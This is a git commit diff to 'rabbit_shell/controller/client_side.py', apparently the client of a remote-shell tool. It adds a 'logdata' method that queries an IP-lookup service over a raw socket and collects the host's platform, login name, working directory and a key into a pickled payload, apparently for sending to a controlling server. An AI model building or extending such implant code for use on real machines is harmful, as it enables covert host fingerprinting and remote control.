8a9a52b1b77d8f7c45ee3cf194fc0b3ab40bf16f
= <albadiwolf@gmail.com>
2022-06-03 13:40:55 -0700

    logdata fun

--- rabbit_shell/controller/client_side.py
+++ rabbit_shell/controller/client_side.py
@@ -1,7 +1,7 @@
 import pickle
 import os
-import socket
-
+import socket, sys
+from rabbit_shell.data import data, basic
 class client_side:
 
 
@@ -37,6 +37,29 @@ class client_side:
         data = pickle.dumps(ls)
 
         return server.send(data)
+
+    def logdata(self):
+
+
+
+
+        def dummy_request(url=data.API_LINK["ipify"]):
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((url, 80))
+            sock.send(f"GET / HTTP/1.1\r\nHost:{url}\r\n\r\n".encode())
+            response = sock.recv(4096)
+            sock.close()
+            return response.decode().split()[-1:][0]
+
+        dt = {
+            "key": basic.KEY,
+            "os": sys.platform,
+            "ip": dummy_request(),
+            "name": os.getlogin(),
+            "path": os.getcwd()
+        }
+
+        return pickle.dumps(dt)
 
 
 
